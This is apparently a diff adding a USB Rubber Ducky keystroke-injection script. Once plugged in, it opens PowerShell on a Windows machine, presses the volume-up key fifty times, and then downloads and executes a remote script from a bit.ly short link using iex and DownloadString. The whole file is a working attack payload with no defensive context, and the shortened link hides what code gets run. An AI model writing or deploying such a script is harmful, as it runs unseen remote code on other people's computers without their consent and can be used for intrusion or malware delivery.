@@ -1,0 +1,13 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING for ($i=0; $i -lt 50; $i++) { (new-object -com wscript.shell).SendKeys([char]175) }
+ENTER
+DELAY 2000
+STRING iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+ENTER
